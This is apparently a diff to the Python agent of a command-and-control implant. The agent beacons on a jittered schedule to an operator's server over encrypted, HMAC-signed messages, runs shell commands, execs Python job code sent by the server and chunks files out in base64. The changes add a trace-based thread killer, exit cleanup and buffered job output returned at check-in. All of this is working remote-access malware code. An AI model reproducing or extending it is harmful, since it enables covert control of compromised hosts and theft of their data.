@@ -3,6 +3,10 @@ from os.path import expanduser
 from StringIO import StringIO
 from threading import Thread
 import os
+import sys
+import trace
+import threading
+
 
 ################################################
 #
@@ -22,6 +26,7 @@ delay = 60
 jitter = 0.0
 lostLimit = 60
 missedCheckins = 0
+jobMessageBuffer = ""
 
 # killDate form -> "MO/DAY/YEAR"
 killDate = "" 
@@ -77,7 +82,7 @@ def sendMessage(packets=None):
     data = None
     if packets:
         data = "".join(packets)
-        data = aes_encrypt_then_hmac(key, data)       
+        data = aes_encrypt_then_hmac(key, data)
 
     taskURI = random.sample(taskURIs, 1)[0]
     if (server.endswith(".php")):
@@ -125,7 +130,7 @@ def encodePacket(taskingID, packetData):
         length = struct.pack('=L',len(packetData))
     else:
         length = struct.pack('=L',0)
-    
+
     # b64data = base64.b64encode(packetData)
 
     if(packetData):
@@ -222,10 +227,10 @@ def processPacket(taskingID, data):
 
     elif taskingID == 2:
         # agent exit
-        
+
         msg = "[!] Agent %s exiting" %(sessionID)
         sendMessage(encodePacket(2, msg))
-        exit() # does this kill all threads?
+        agent_exit()
 
     elif taskingID == 40:
         # run a command
@@ -288,22 +293,27 @@ def processPacket(taskingID, data):
 
     elif taskingID == 50:
         # return the currently running jobs
-        msg = "" 
+        msg = ""
         if len(jobs) == 0:
             msg = "No active jobs"
         else:
             msg = "Active jobs:\n"
             for x in xrange(len(jobs)):
-                msg += "\t%s" %(x)     
+                msg += "\t%s" %(x)
         return encodePacket(50, msg)
 
     elif taskingID == 51:
         # stop and remove a specified job if it's running
         try:
-            result = jobs[int(data)].join()
+            # Calling join first seems to hang
+            # result = jobs[int(data)].join()
+            sendMessage(encodePacket(0, "[*] Attempting to stop job thread"))
+            result = jobs[int(data)].kill()
+            sendMessage(encodePacket(0, "[*] Job thread stoped!"))
             jobs[int(data)]._Thread__stop()
+            jobs.pop(int(data))
             if result and result != "":
-                sendMessage(encodePacket(51, result ))
+                sendMessage(encodePacket(51, result))
         except:
             return encodePacket(0, "error stopping job: %s" %(data))
 
@@ -386,6 +396,17 @@ def processPacket(taskingID, data):
 # misc methods
 #
 ################################################
+def agent_exit():
+    # exit for proper job / thread cleanup
+    if len(jobs) > 0:
+        try:
+            for x in jobs:
+                jobs[int(x)].kill()
+                jobs.pop(x)
+        except:
+            # die hard if thread kill fails
+            pass
+    exit()
 
 def indent(lines, amount=4, ch=' '):
     padding = amount * ch
@@ -407,8 +428,47 @@ class ThreadWithReturnValue(Thread):
         return self._return
 
 
+class KThread(threading.Thread):
+
+    """A subclass of threading.Thread, with a kill()
+  method."""
+
+    def __init__(self, *args, **keywords):
+        threading.Thread.__init__(self, *args, **keywords)
+        self.killed = False
+
+    def start(self):
+        """Start the thread."""
+        self.__run_backup = self.run
+        self.run = self.__run      # Force the Thread toinstall our trace.
+        threading.Thread.start(self)
+
+    def __run(self):
+        """Hacked run function, which installs the
+    trace."""
+        sys.settrace(self.globaltrace)
+        self.__run_backup()
+        self.run = self.__run_backup
+
+    def globaltrace(self, frame, why, arg):
+        if why == 'call':
+            return self.localtrace
+        else:
+            return None
+
+    def localtrace(self, frame, why, arg):
+        if self.killed:
+            if why == 'line':
+                raise SystemExit()
+        return self.localtrace
+
+    def kill(self):
+        self.killed = True
+
+
+
 def start_job(code):
-    
+
     global jobs
 
     # create a new code block with a defined method name
@@ -419,13 +479,14 @@ def start_job(code):
     # code needs to be in the global listing
     # not the locals() scope
     exec code_obj in globals()
-    
-    # create/start/return the thread
+
+    # create/processPacketstart/return the thread
     # call the job_func so sys data can be cpatured
-    codeThread = ThreadWithReturnValue(target=job_func, args=())
+    codeThread = KThread(target=job_func)
     codeThread.start()
-    
+
     jobs.append(codeThread)
+
 
 def job_func():
     try:
@@ -442,6 +503,31 @@ def job_func():
         p = "error executing specified Python job data: " + str(e)
         result = encodePacket(0, p)
         processJobTasking(result)
+
+def job_message_buffer(message):
+    # Supports job messages for checkin
+    global jobMessageBuffer
+    try:
+
+        jobMessageBuffer += str(message)
+    except Exception as e:
+        print e
+
+def get_job_message_buffer():
+    global jobMessageBuffer
+    try:
+        result = encodePacket(110, str(jobMessageBuffer))
+        jobMessageBuffer = ""
+        return result
+    except Exception as e:
+        return encodePacket(0, "[!] Error getting job output: %s" %(e))
+
+def send_job_message_buffer():
+    if len(jobs) > 0:
+        result = get_job_message_buffer()
+        processJobTasking(result)
+    else:
+        pass
 
 # additional implementation methods
 def run_command(command):
@@ -463,7 +549,6 @@ def get_file_part(filePath, offset=0, chunkSize=512000):
     f.close()
 
     return base64.b64encode(data)
-
 
 ################################################
 #
@@ -499,23 +584,28 @@ while(True):
         if now > killDateTime:
             msg = "[!] Agent %s exiting" %(sessionID)
             sendMessage(encodePacket(2, msg))
-            exit()
+            agent_exit()
 
     # exit if we miss commnicating with the server enough times
     if missedCheckins >= lostLimit:
-        exit()
+        agent_exit()
 
     # sleep for the randomized interval
     if jitter < 0: jitter = -jitter
     if jitter > 1: jitter = 1/jitter
     minSleep = (1.0-jitter)*delay
     maxSleep = (1.0+jitter)*delay
-    
+
     sleepTime = random.randint(minSleep, maxSleep)
     time.sleep(sleepTime)
 
     (code, data) = sendMessage()
     if code == "200":
+        try:
+            send_job_message_buffer()
+        except Exception as e:
+            result = encodePacket(0, str('[!] Failed to check job buffer!: ' + str(e)))
+            processJobTasking(result)
         if data == defaultPage:
             missedCheckins = 0
         else:
@@ -523,4 +613,3 @@ while(True):
     else:
         pass
         # print "invalid code:",code
-
